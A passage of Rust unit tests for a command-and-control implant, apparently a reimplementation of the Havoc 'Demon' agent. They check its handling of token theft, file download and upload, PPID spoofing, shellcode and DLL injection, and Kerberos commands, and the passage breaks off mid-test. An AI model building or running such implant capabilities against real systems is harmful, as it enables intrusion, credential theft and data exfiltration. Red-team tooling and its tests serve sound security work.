        assert_eq!(subcmd, u32::from(DemonTokenCommand::FindTokens));
        let success = parse_u32_le(&resp.payload, &mut off).expect("success");
        assert_eq!(success, 0); // Not yet implemented
    }

    // ── Token::PrivsGetOrList ───────────────────────────────────────────────

    #[test]
    fn token_privs_list_returns_respond() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        // list_privs = 1 (list mode)
        let args = 1u32.to_le_bytes().to_vec();
        let package = token_package(DemonTokenCommand::PrivsGetOrList, &args);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::PrivsGetOrList));
        let list_flag = parse_u32_le(&resp.payload, &mut off).expect("list_privs");
        assert_eq!(list_flag, 1);
    }

    // ── Token::Steal ────────────────────────────────────────────────────────

    #[test]
    fn token_steal_invalid_pid_returns_ignore() {
        // On non-Windows, steal always fails; on Windows, PID 0 is invalid.
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let mut args = Vec::new();
        args.extend_from_slice(&0u32.to_le_bytes()); // pid = 0
        args.extend_from_slice(&0u32.to_le_bytes()); // handle = 0
        let package = token_package(DemonTokenCommand::Steal, &args);
        // On non-Windows stubs, steal returns Err → DispatchResult::Ignore.
        let result = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── Token::Make ─────────────────────────────────────────────────────────

    #[test]
    fn token_make_returns_respond_on_non_windows() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();

        // Build args: [domain: wbytes][user: wbytes][password: wbytes][logon_type: u32]
        let mut args = Vec::new();
        let to_wbytes = |s: &str| -> Vec<u8> {
            let utf16: Vec<u8> = s
                .encode_utf16()
                .chain(std::iter::once(0u16))
                .flat_map(|c| c.to_le_bytes())
                .collect();
            let mut b = (utf16.len() as u32).to_le_bytes().to_vec();
            b.extend_from_slice(&utf16);
            b
        };
        args.extend_from_slice(&to_wbytes("DOMAIN"));
        args.extend_from_slice(&to_wbytes("user"));
        args.extend_from_slice(&to_wbytes("pass"));
        args.extend_from_slice(&9u32.to_le_bytes()); // LOGON32_LOGON_NEW_CREDENTIALS

        let package = token_package(DemonTokenCommand::Make, &args);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        // On non-Windows: make_token fails, so response has subcmd but no domain_user.
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::Make));
        // Vault should remain empty on failure.
        assert!(vault.is_empty());
    }

    // ── Token dispatch: unknown subcommand ──────────────────────────────────

    #[test]
    fn token_unknown_subcommand_returns_ignore() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        // Subcommand 255 is not defined.
        let payload = 255u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandToken, 1, payload);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut vault,
                &mut downloads,
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new()
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn token_empty_payload_returns_ignore() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let package = DemonPackage::new(DemonCommand::CommandToken, 1, vec![]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut vault,
                &mut downloads,
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new()
            ),
            DispatchResult::Ignore
        ));
    }

    // ── CommandTransfer tests ───────────────────────────────────────────────

    /// Build a CommandTransfer payload: `[subcmd: u32 LE][args…]`
    fn transfer_payload(subcmd: u32, args: &[u8]) -> Vec<u8> {
        let mut v = subcmd.to_le_bytes().to_vec();
        v.extend_from_slice(args);
        v
    }

    #[test]
    fn transfer_list_empty_returns_subcmd_only() {
        let payload = transfer_payload(0, &[]); // List = 0
        let downloads = DownloadTracker::new();
        let result = handle_transfer(&payload, &mut { downloads });
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandTransfer));
        // Payload: just the subcommand echo (4 bytes).
        assert_eq!(resp.payload.len(), 4);
        let subcmd_echo = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert_eq!(subcmd_echo, 0); // List
    }

    #[test]
    fn transfer_list_with_active_download() {
        let mut downloads = DownloadTracker::new();
        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_test_tl_{}", rand::random::<u32>()));
        std::fs::write(&path, b"data").expect("write");
        let file = std::fs::File::open(&path).expect("open");
        let file_id = downloads.add(file, 1, 4);

        let payload = transfer_payload(0, &[]);
        let result = handle_transfer(&payload, &mut downloads);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        // Payload: subcmd(4) + file_id(4) + read_size(4) + state(4) = 16 bytes
        assert_eq!(resp.payload.len(), 16);
        let listed_id = u32::from_le_bytes(resp.payload[4..8].try_into().expect("u32"));
        assert_eq!(listed_id, file_id);
        let state = u32::from_le_bytes(resp.payload[12..16].try_into().expect("u32"));
        assert_eq!(state, 1); // Running
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn transfer_stop_found() {
        let mut downloads = DownloadTracker::new();
        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_test_ts_{}", rand::random::<u32>()));
        std::fs::write(&path, b"data").expect("write");
        let file = std::fs::File::open(&path).expect("open");
        let file_id = downloads.add(file, 1, 4);

        let payload = transfer_payload(1, &file_id.to_le_bytes());
        let result = handle_transfer(&payload, &mut downloads);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        // [subcmd(4)][found(4)][file_id(4)]
        assert_eq!(resp.payload.len(), 12);
        let found = u32::from_le_bytes(resp.payload[4..8].try_into().expect("u32"));
        assert_eq!(found, 1);
        assert_eq!(downloads.get(file_id).expect("entry").state, DownloadState::Stopped);
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn transfer_stop_not_found() {
        let mut downloads = DownloadTracker::new();
        let payload = transfer_payload(1, &0xDEADu32.to_le_bytes());
        let result = handle_transfer(&payload, &mut downloads);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        let found = u32::from_le_bytes(resp.payload[4..8].try_into().expect("u32"));
        assert_eq!(found, 0);
    }

    #[test]
    fn transfer_resume_found() {
        let mut downloads = DownloadTracker::new();
        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_test_tr_{}", rand::random::<u32>()));
        std::fs::write(&path, b"data").expect("write");
        let file = std::fs::File::open(&path).expect("open");
        let file_id = downloads.add(file, 1, 4);
        downloads.get_mut(file_id).expect("entry").state = DownloadState::Stopped;

        let payload = transfer_payload(2, &file_id.to_le_bytes());
        let result = handle_transfer(&payload, &mut downloads);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        let found = u32::from_le_bytes(resp.payload[4..8].try_into().expect("u32"));
        assert_eq!(found, 1);
        assert_eq!(downloads.get(file_id).expect("entry").state, DownloadState::Running);
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn transfer_remove_found_returns_multi_respond() {
        let mut downloads = DownloadTracker::new();
        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_test_trm_{}", rand::random::<u32>()));
        std::fs::write(&path, b"data").expect("write");
        let file = std::fs::File::open(&path).expect("open");
        let file_id = downloads.add(file, 1, 4);

        let payload = transfer_payload(3, &file_id.to_le_bytes());
        let result = handle_transfer(&payload, &mut downloads);
        let DispatchResult::MultiRespond(resps) = result else {
            panic!("expected MultiRespond, got {result:?}");
        };
        assert_eq!(resps.len(), 2);
        // First: [subcmd][found=1][file_id]
        let found = u32::from_le_bytes(resps[0].payload[4..8].try_into().expect("u32"));
        assert_eq!(found, 1);
        // Second: [subcmd][file_id][reason=REMOVED(1)]
        let reason = u32::from_le_bytes(resps[1].payload[8..12].try_into().expect("u32"));
        assert_eq!(reason, DOWNLOAD_REASON_REMOVED);
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn transfer_remove_not_found_returns_single() {
        let mut downloads = DownloadTracker::new();
        let payload = transfer_payload(3, &0xBEEFu32.to_le_bytes());
        let result = handle_transfer(&payload, &mut downloads);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        let found = u32::from_le_bytes(resp.payload[4..8].try_into().expect("u32"));
        assert_eq!(found, 0);
    }

    #[test]
    fn transfer_unknown_subcommand_returns_ignore() {
        let mut downloads = DownloadTracker::new();
        let payload = transfer_payload(255, &[]);
        let result = handle_transfer(&payload, &mut downloads);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn transfer_empty_payload_returns_ignore() {
        let mut downloads = DownloadTracker::new();
        let result = handle_transfer(&[], &mut downloads);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── FS Download tests ───────────────────────────────────────────────────

    #[test]
    fn fs_download_opens_file_and_returns_open_header() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_test_fsd_{}", rand::random::<u32>()));
        std::fs::write(&path, b"hello world").expect("write");

        let path_str = path.display().to_string();
        let rest = le_utf16le_payload(&path_str);
        let mut downloads = DownloadTracker::new();
        let result = handle_fs_download(2, &rest, 42, &mut downloads);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };

        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));

        // Parse the BE header: [subcmd(4)][mode(4)][file_id(4)][file_size(8)][path…]
        let payload = &resp.payload;
        let subcmd = u32::from_be_bytes(payload[0..4].try_into().expect("u32"));
        assert_eq!(subcmd, 2); // Download
        let mode = u32::from_be_bytes(payload[4..8].try_into().expect("u32"));
        assert_eq!(mode, DOWNLOAD_MODE_OPEN);
        let file_size = u64::from_be_bytes(payload[12..20].try_into().expect("u64"));
        assert_eq!(file_size, 11); // "hello world".len()

        // Download should be registered.
        assert_eq!(downloads.len(), 1);

        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn fs_download_nonexistent_file_returns_ignore() {
        let rest = le_utf16le_payload("/tmp/specter_nonexistent_file_test_12345");
        let mut downloads = DownloadTracker::new();
        let result = handle_fs_download(2, &rest, 1, &mut downloads);
        assert!(matches!(result, DispatchResult::Ignore));
        assert!(downloads.is_empty());
    }

    // ── FS Upload tests ─────────────────────────────────────────────────────

    #[test]
    fn fs_upload_writes_file_from_memfile() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_test_fsu_{}", rand::random::<u32>()));
        let path_str = path.display().to_string();
        let content = b"uploaded data";
        let mem_file_id: u32 = 42;

        // Pre-stage the MemFile.
        let mut mem_files: MemFileStore = HashMap::new();
        mem_files
            .insert(mem_file_id, MemFile { expected_size: content.len(), data: content.to_vec() });

        // Build payload: [path: bytes LE (UTF-16LE)][mem_file_id: u32 LE]
        let mut rest = le_utf16le_payload(&path_str);
        rest.extend_from_slice(&mem_file_id.to_le_bytes());

        let result = handle_fs_upload(3, &rest, &mut mem_files);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };

        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));

        // Verify file was written.
        let written = std::fs::read(&path).expect("read back");
        assert_eq!(written, content);

        // Parse BE response: [subcmd(4)][file_size(4)][path…]
        let file_size = u32::from_be_bytes(resp.payload[4..8].try_into().expect("u32"));
        assert_eq!(file_size, content.len() as u32);

        // MemFile should be consumed.
        assert!(!mem_files.contains_key(&mem_file_id));

        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn fs_upload_missing_memfile_returns_ignore() {
        let mut mem_files: MemFileStore = HashMap::new();
        // Build payload: [path: bytes LE][mem_file_id: u32 LE]
        let mut rest = le_utf16le_payload("/tmp/specter_test_no_memfile");
        rest.extend_from_slice(&99u32.to_le_bytes()); // non-existent memfile ID
        let result = handle_fs_upload(3, &rest, &mut mem_files);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn fs_upload_incomplete_memfile_returns_ignore() {
        let mut mem_files: MemFileStore = HashMap::new();
        mem_files.insert(
            7,
            MemFile {
                expected_size: 100,
                data: vec![0u8; 50], // only half staged
            },
        );
        let mut rest = le_utf16le_payload("/tmp/specter_test_incomplete");
        rest.extend_from_slice(&7u32.to_le_bytes());
        let result = handle_fs_upload(3, &rest, &mut mem_files);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── MemFile tests ────────────────────────────────────────────────────────

    /// Build a MemFile payload: [mem_file_id: u32 LE][total_size: u64 LE][chunk: bytes LE]
    fn memfile_payload(mem_file_id: u32, total_size: u64, chunk: &[u8]) -> Vec<u8> {
        let mut v = Vec::new();
        v.extend_from_slice(&mem_file_id.to_le_bytes());
        v.extend_from_slice(&total_size.to_le_bytes());
        v.extend_from_slice(&(chunk.len() as u32).to_le_bytes());
        v.extend_from_slice(chunk);
        v
    }

    #[test]
    fn parse_u64_le_reads_correct_value() {
        let buf = 0x0102_0304_0506_0708u64.to_le_bytes();
        let mut offset = 0;
        assert_eq!(parse_u64_le(&buf, &mut offset).expect("parse"), 0x0102_0304_0506_0708);
        assert_eq!(offset, 8);
    }

    #[test]
    fn parse_u64_le_too_short_returns_error() {
        let buf = [0u8; 7];
        let mut offset = 0;
        assert!(parse_u64_le(&buf, &mut offset).is_err());
    }

    #[test]
    fn memfile_single_chunk_complete() {
        let data = b"hello world";
        let payload = memfile_payload(1, data.len() as u64, data);
        let mut store: MemFileStore = HashMap::new();

        let result = handle_memfile(&payload, 10, &mut store);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandMemFile));
        assert_eq!(resp.request_id, 10);
        // success = true (1)
        assert_eq!(u32::from_be_bytes(resp.payload[4..8].try_into().unwrap()), 1);

        let entry = store.get(&1).expect("memfile should exist");
        assert!(entry.is_complete());
        assert_eq!(entry.data, data);
    }

    #[test]
    fn memfile_multi_chunk_accumulates() {
        let mut store: MemFileStore = HashMap::new();
        let total: u64 = 10;

        // First chunk: 6 bytes.
        let payload1 = memfile_payload(5, total, &[1, 2, 3, 4, 5, 6]);
        let result1 = handle_memfile(&payload1, 1, &mut store);
        assert!(matches!(result1, DispatchResult::Respond(_)));
        assert!(!store.get(&5).unwrap().is_complete());

        // Second chunk: 4 bytes — completes the file.
        let payload2 = memfile_payload(5, total, &[7, 8, 9, 10]);
        let result2 = handle_memfile(&payload2, 2, &mut store);
        assert!(matches!(result2, DispatchResult::Respond(_)));
        assert!(store.get(&5).unwrap().is_complete());
        assert_eq!(store.get(&5).unwrap().data, &[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]);
    }

    #[test]
    fn memfile_size_mismatch_returns_failure() {
        let mut store: MemFileStore = HashMap::new();

        // First chunk declares total_size = 10.
        let payload1 = memfile_payload(3, 10, &[1, 2, 3]);
        let _ = handle_memfile(&payload1, 1, &mut store);

        // Second chunk declares total_size = 20 (mismatch).
        let payload2 = memfile_payload(3, 20, &[4, 5, 6]);
        let result = handle_memfile(&payload2, 2, &mut store);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        // success = false (0)
        assert_eq!(u32::from_be_bytes(resp.payload[4..8].try_into().unwrap()), 0);
    }

    #[test]
    fn memfile_truncates_overflow() {
        let mut store: MemFileStore = HashMap::new();
        // Declare total_size = 4 but send 6 bytes.
        let payload = memfile_payload(8, 4, &[1, 2, 3, 4, 5, 6]);
        let _ = handle_memfile(&payload, 1, &mut store);
        let entry = store.get(&8).unwrap();
        assert_eq!(entry.data, &[1, 2, 3, 4]);
        assert!(entry.is_complete());
    }

    #[test]
    fn memfile_then_upload_end_to_end() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_test_mfu_{}", rand::random::<u32>()));
        let path_str = path.display().to_string();
        let content = b"memfile-upload";
        let mem_id: u32 = 77;

        let mut store: MemFileStore = HashMap::new();

        // Stage the MemFile.
        let mf_payload = memfile_payload(mem_id, content.len() as u64, content);
        let _ = handle_memfile(&mf_payload, 1, &mut store);
        assert!(store.get(&mem_id).unwrap().is_complete());

        // Now issue the Upload command referencing the MemFile.
        let mut rest = le_utf16le_payload(&path_str);
        rest.extend_from_slice(&mem_id.to_le_bytes());
        let result = handle_fs_upload(3, &rest, &mut store);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));

        // File written correctly.
        let written = std::fs::read(&path).expect("read back");
        assert_eq!(written, content);

        // MemFile consumed.
        assert!(!store.contains_key(&mem_id));

        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn dispatch_routes_command_memfile() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let mut mem_files: MemFileStore = HashMap::new();

        let payload = memfile_payload(1, 5, &[1, 2, 3, 4, 5]);
        let package = DemonPackage::new(DemonCommand::CommandMemFile, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut mem_files,
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
        assert!(mem_files.contains_key(&1));
    }

    // ── dispatch routing tests for new commands ─────────────────────────────

    #[test]
    fn dispatch_routes_command_transfer() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let payload = transfer_payload(0, &[]); // Transfer::List
        let package = DemonPackage::new(DemonCommand::CommandTransfer, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    // ── Process injection tests ─────────────────────────────────────────────

    /// Build a `CommandProcPpidSpoof` payload: LE u32 PID.
    fn ppid_spoof_payload(ppid: u32) -> Vec<u8> {
        ppid.to_le_bytes().to_vec()
    }

    /// Build a `CommandInjectShellcode` payload for the Inject way.
    fn inject_shellcode_inject_payload(
        method: u32,
        x64: u32,
        shellcode: &[u8],
        args: &[u8],
        pid: u32,
    ) -> Vec<u8> {
        let mut v = Vec::new();
        v.extend_from_slice(&u32::from(DemonInjectWay::Inject).to_le_bytes());
        v.extend_from_slice(&method.to_le_bytes());
        v.extend_from_slice(&x64.to_le_bytes());
        // shellcode (length-prefixed)
        v.extend_from_slice(&(shellcode.len() as u32).to_le_bytes());
        v.extend_from_slice(shellcode);
        // args (length-prefixed)
        v.extend_from_slice(&(args.len() as u32).to_le_bytes());
        v.extend_from_slice(args);
        // target PID
        v.extend_from_slice(&pid.to_le_bytes());
        v
    }

    /// Build a `CommandInjectShellcode` payload for the Spawn way (no PID).
    fn inject_shellcode_spawn_payload(
        method: u32,
        x64: u32,
        shellcode: &[u8],
        args: &[u8],
    ) -> Vec<u8> {
        let mut v = Vec::new();
        v.extend_from_slice(&u32::from(DemonInjectWay::Spawn).to_le_bytes());
        v.extend_from_slice(&method.to_le_bytes());
        v.extend_from_slice(&x64.to_le_bytes());
        v.extend_from_slice(&(shellcode.len() as u32).to_le_bytes());
        v.extend_from_slice(shellcode);
        v.extend_from_slice(&(args.len() as u32).to_le_bytes());
        v.extend_from_slice(args);
        v
    }

    /// Build a `CommandInjectDll` payload.
    fn inject_dll_payload(
        technique: u32,
        pid: u32,
        loader: &[u8],
        dll: &[u8],
        params: &[u8],
    ) -> Vec<u8> {
        let mut v = Vec::new();
        v.extend_from_slice(&technique.to_le_bytes());
        v.extend_from_slice(&pid.to_le_bytes());
        v.extend_from_slice(&(loader.len() as u32).to_le_bytes());
        v.extend_from_slice(loader);
        v.extend_from_slice(&(dll.len() as u32).to_le_bytes());
        v.extend_from_slice(dll);
        v.extend_from_slice(&(params.len() as u32).to_le_bytes());
        v.extend_from_slice(params);
        v
    }

    /// Build a `CommandSpawnDll` payload.
    fn spawn_dll_payload(loader: &[u8], dll: &[u8], args: &[u8]) -> Vec<u8> {
        let mut v = Vec::new();
        v.extend_from_slice(&(loader.len() as u32).to_le_bytes());
        v.extend_from_slice(loader);
        v.extend_from_slice(&(dll.len() as u32).to_le_bytes());
        v.extend_from_slice(dll);
        v.extend_from_slice(&(args.len() as u32).to_le_bytes());
        v.extend_from_slice(args);
        v
    }

    // ── CommandProcPpidSpoof ─────────────────────────────────────────────────

    #[test]
    fn handle_proc_ppid_spoof_updates_config() {
        let mut config = SpecterConfig::default();
        assert!(config.ppid_spoof.is_none());

        let payload = ppid_spoof_payload(1234);
        let result = handle_proc_ppid_spoof(&payload, &mut config);

        assert_eq!(config.ppid_spoof, Some(1234));

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProcPpidSpoof));

        // Response payload: LE u32 PPID.
        assert_eq!(resp.payload.len(), 4);
        let ppid = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
        assert_eq!(ppid, 1234);
    }

    #[test]
    fn handle_proc_ppid_spoof_empty_payload_ignores() {
        let mut config = SpecterConfig::default();
        let result = handle_proc_ppid_spoof(&[], &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
        assert!(config.ppid_spoof.is_none());
    }

    #[test]
    fn dispatch_routes_proc_ppid_spoof() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let payload = ppid_spoof_payload(5678);
        let package = DemonPackage::new(DemonCommand::CommandProcPpidSpoof, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
        assert_eq!(config.ppid_spoof, Some(5678));
    }

    // ── CommandInjectShellcode ───────────────────────────────────────────────

    #[test]
    fn handle_inject_shellcode_inject_returns_response() {
        let shellcode = &[0x90, 0x90, 0xCC];
        let args = &[0x41, 0x42];
        let payload = inject_shellcode_inject_payload(0, 1, shellcode, args, 4444);
        let result = handle_inject_shellcode(&payload);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInjectShellcode));
        assert_eq!(resp.payload.len(), 4);

        // On non-Windows: status should be Failed (1).
        if !cfg!(windows) {
            let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
            assert_eq!(status, u32::from(DemonInjectError::Failed));
        }
    }

    #[test]
    fn handle_inject_shellcode_spawn_returns_response() {
        let shellcode = &[0xCC];
        let payload = inject_shellcode_spawn_payload(0, 1, shellcode, &[]);
        let result = handle_inject_shellcode(&payload);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInjectShellcode));
        assert_eq!(resp.payload.len(), 4);
    }

    #[test]
    fn handle_inject_shellcode_empty_payload_returns_invalid_param() {
        let result = handle_inject_shellcode(&[]);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
        assert_eq!(status, u32::from(DemonInjectError::InvalidParam));
    }

    #[test]
    fn dispatch_routes_inject_shellcode() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let payload = inject_shellcode_inject_payload(0, 1, &[0x90], &[], 1234);
        let package = DemonPackage::new(DemonCommand::CommandInjectShellcode, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    // ── CommandInjectDll ─────────────────────────────────────────────────────

    #[test]
    fn handle_inject_dll_returns_response() {
        let loader = &[0xCC, 0xDD, 0xEE];
        let dll = &[0x4D, 0x5A, 0x90, 0x00];
        let params = b"test-param";
        let payload = inject_dll_payload(0, 1234, loader, dll, params);
        let result = handle_inject_dll(&payload);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInjectDll));
        assert_eq!(resp.payload.len(), 4);

        if !cfg!(windows) {
            let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
            assert_eq!(status, u32::from(DemonInjectError::Failed));
        }
    }

    #[test]
    fn handle_inject_dll_empty_payload_returns_invalid_param() {
        let result = handle_inject_dll(&[]);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
        assert_eq!(status, u32::from(DemonInjectError::InvalidParam));
    }

    #[test]
    fn dispatch_routes_inject_dll() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let payload = inject_dll_payload(0, 999, &[0xCC], &[0x4D, 0x5A], b"arg");
        let package = DemonPackage::new(DemonCommand::CommandInjectDll, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    // ── CommandSpawnDll ──────────────────────────────────────────────────────

    #[test]
    fn handle_spawn_dll_returns_response() {
        let loader = &[0x11, 0x22, 0x33];
        let dll = &[0x4D, 0x5A];
        let args = b"spawn-args";
        let payload = spawn_dll_payload(loader, dll, args);
        let result = handle_spawn_dll(&payload);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandSpawnDll));
        assert_eq!(resp.payload.len(), 4);

        if !cfg!(windows) {
            let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
            assert_eq!(status, u32::from(DemonInjectError::Failed));
        }
    }

    #[test]
    fn handle_spawn_dll_empty_payload_returns_invalid_param() {
        let result = handle_spawn_dll(&[]);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
        assert_eq!(status, u32::from(DemonInjectError::InvalidParam));
    }

    #[test]
    fn dispatch_routes_spawn_dll() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let payload = spawn_dll_payload(&[0xAA], &[0xBB], b"args");
        let package = DemonPackage::new(DemonCommand::CommandSpawnDll, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    // ── inject_status_response helper ────────────────────────────────────────

    #[test]
    fn inject_status_response_encodes_le() {
        let result =
            inject_status_response(DemonCommand::CommandInjectShellcode, DemonInjectError::Success);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.payload, 0u32.to_le_bytes());
    }

    #[test]
    fn inject_status_response_failed() {
        let result =
            inject_status_response(DemonCommand::CommandInjectDll, DemonInjectError::Failed);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.payload, 1u32.to_le_bytes());
    }

    #[test]
    fn inject_status_response_arch_mismatch() {
        let result = inject_status_response(
            DemonCommand::CommandSpawnDll,
            DemonInjectError::ProcessArchMismatch,
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.payload, 3u32.to_le_bytes());
    }

    // ── Kerberos tests ─────────────────────────────────────────────────────

    /// Build a Kerberos task payload with the given subcommand and extra args.
    fn kerberos_payload(subcmd: u32, extra: &[u8]) -> Vec<u8> {
        let mut v = subcmd.to_le_bytes().to_vec();
        v.extend_from_slice(extra);
        v
    }

    #[test]
    fn kerberos_dispatch_routes_to_handler() {
        let payload = kerberos_payload(0, &[]); // Luid subcommand
        let pkg = DemonPackage {
            command_id: u32::from(DemonCommand::CommandKerberos),
            request_id: 1,
            payload,
        };
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::default();
        let mut mem_files = MemFileStore::new();
        let result = dispatch(
            &pkg,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut mem_files,
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        // On non-Windows, get_luid returns error → success=FALSE.
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandKerberos));
        // Parse: [subcmd=0][success=0]
        assert!(resp.payload.len() >= 8);
        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 0); // subcmd
        // On non-Windows, success is 0 (FALSE)
        #[cfg(not(windows))]
